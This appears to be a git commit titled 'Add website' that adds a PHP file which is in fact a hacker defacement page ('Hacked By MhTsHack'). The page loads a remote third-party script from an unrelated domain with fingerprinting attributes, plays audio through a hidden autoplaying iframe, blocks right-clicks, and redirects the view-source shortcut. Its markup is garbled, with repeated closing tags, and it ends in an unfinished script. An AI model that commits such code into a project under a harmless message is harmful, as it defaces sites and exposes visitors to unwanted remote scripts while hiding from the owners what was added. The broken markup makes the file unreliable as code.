a17fc6306b9135ce4875afeb56cca09f1e51828d
Tate Jennings <tatejennings@gmail.com>
2024-07-29 17:17:16 -0700

    Add website

---
+++ docs/gg.php
@@ -0,0 +1,96 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+ <script id="vitruvian" type="text/javascript" async="true" src="https://awe.wonderclack.com/kernel/EA901108-FCE8-48FB-83C7-F1841F9272B0?aid=21CA9F7C-77B9-470A-B9B9-D5A1FFC1D8C7&amp;iid=BA26C8C7-F67C-4105-BDD5-509036BEF65D&amp;itm=2015-05-29T23:15:43Z" data-nid="EA901108-FCE8-48FB-83C7-F1841F9272B0" data-ie-pid="00000000-0000-0000-0000-000000000000" data-cr-pid="00000000-0000-0000-0000-000000000000" data-ff-pid="00000000-0000-0000-0000-000000000000" data-nf-pid="EC83B275-90E6-42ED-9BEA-0FE0438940AB" data-pid="EC83B275-90E6-42ED-9BEA-0FE0438940AB" data-aid="21CA9F7C-77B9-470A-B9B9-D5A1FFC1D8C7" data-iid="BA26C8C7-F67C-4105-BDD5-509036BEF65D" data-ver="1.10.0.16" data-itm="2015-05-29T23:15:43Z" data-hid="33C17C63-A138-31A4-FA04-D95889F38A35" data-ie-at="00000000-0000-0000-0000-000000000000" data-cr-at="00000000-0000-0000-0000-000000000000" data-ff-at="00000000-0000-0000-0000-000000000000" data-nf-at="59AAF681-F56F-02EE-53F3-8DC1F3ED47FC" data-at="59AAF681-F56F-02EE-53F3-8DC1F3ED47FC" data-ie-ver="11.0.9600.17801" data-cr-ver="43.0.2357.81" data-ff-ver="" data-dbsr="chrome" data-osn="Windows 7 Ultimate" data-osv="6.1.7600" data-ost="x64" data-bsr="NF" ></script>
+<link rel="Shortcut Icon" href="http://i.hizliresim.com/1y3qzA.png" type="image/x-icon">
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Hacked By MhTsHack</title>
+<style type="text/css">
+
+body {
+background-color: #000000;
+	background-image: url(http://i.hizliresim.com/pgalAq.png);
+	background-size:100%; margin:0px;padding:0px;
+	min-width:650px;
+  background-clip:box;
+  background-origin:padding-box;
+ background-repeat:no-repeat;
+  background-position:center;
+  background-attachment:fixed;}
+.style14 {color: #FFFFFF; font-weight: bold; }
+.style37 {
+	color: #F0F0F0;
+	font-weight: bold;
+	font-size: 10px;
+}
+.style38 {color: #9B0E0A}
+.style40 {color: #600A0C; font-weight: bold; }
+.style42 {
+	color: #333333;
+	font-weight: bold;
+	font-size: 14px;
+}
+.style43 {color: #D9120D}
+
+</style>
+</head>
+<p>
+<iframe width="1" height="1" src="http://www.youtube.com/embed/KE5t_7ZytSg?rel=0&autoplay=1&loop=1&playlist=ekXDteouiC0" frameborder="0" allowfullscreen></iframe>
+</object>	
+</body>
+</html>
+
+<br />
+</html>
+			
+	
+		</script>
+
+	</head>
+        <!---kopyalama yasak mesaji--->
+<script language="Javascript1.2"> 
+<!--
+// please keep these lines on when you copy the source
+// made by: FethiBey
+
+var mymessage = "  Hacked By Fethi Bey (MhTsHack) ";
+
+function rtclickcheck(keyp){
+  if (navigator.appName == "Netscape" && keyp.which == 3) {
+    alert(mymessage);
+    return false;
+  }
+
+  if (navigator.appVersion.indexOf("MSIE") != -1 && event.button == 2) {
+    alert(mymessage);
+    return false;
+  }
+}
+
+document.onmousedown = rtclickcheck
+//-->
+</script>
+
+<!---kopyalama yasak mesaji--->
+</html>
+      <script type='text/javascript'>
+	//<![CDATA[
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="https://www.youtube.com/watch?v=Sl08DN_mets"});
+//]]>
+      </script>
+</html>
+<SCRIPT language=JavaScript>curPage=1; 
+document.oncontextmenu = function(){return false} 
+if(document.layers) { 
+   window.captureEvents(Event.MOUSEDOWN); 
+   window.onmousedown = function(e){ 
+      if(e.target==document)return false; 
+   } 
+} 
+else { 
+   document.onmousedown = function(){return false} 
+}</SCRIPT> 
+<script language="JavaScript1.2"> 
+
+           
